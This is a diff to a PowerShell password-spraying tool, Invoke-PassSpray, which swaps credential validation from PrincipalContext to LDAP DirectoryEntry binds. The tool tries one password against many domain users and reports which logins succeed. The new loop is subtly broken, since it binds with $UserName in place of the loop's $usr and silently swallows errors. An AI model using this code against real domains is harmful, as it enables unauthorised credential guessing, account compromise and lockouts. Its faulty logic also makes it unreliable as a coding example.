@@ -9,8 +9,6 @@ Domain Password Spray
 
 #>
 
-Add-Type -AssemblyName System.DirectoryServices.AccountManagement
-
 function Invoke-PassSpray {
 	Param
     (
@@ -53,14 +51,20 @@ function Invoke-PassSpray {
 	#$AllUsers = $AllUsers | Where-Object { $_ -ne "" }
 	$AllUsers = $AllUsers | Where-Object { $_ -ne "0" }
 	
+	$KeepTrack = $False
+ 	$LDAPPath = "LDAP://"
+    	$LDAPPath += $Domain
+     	
 	foreach($usr in $AllUsers){
-		$target = "$Domain" + "\" + "$usr"
-		$principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $Domain, $DomainController)
-		$isValid = $principalContext.ValidateCredentials($target, $Password)
-		if ($isValid) {
-			Write-Output "[+] Success: $usr $Password"
-		}
+		try {
+		        $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAPPath, $UserName, $Password)
+		        if ($directoryEntry.name -ne $null) {
+		            Write-Output "[+] Authentication Successful for user $UserName"
+		            $KeepTrack = $True
+		        }
+		} catch {}
 	}
+ 	if($KeepTrack -eq $False){Write-Output "[-] No Success"}
 }
 
 function Get-ADUsers {
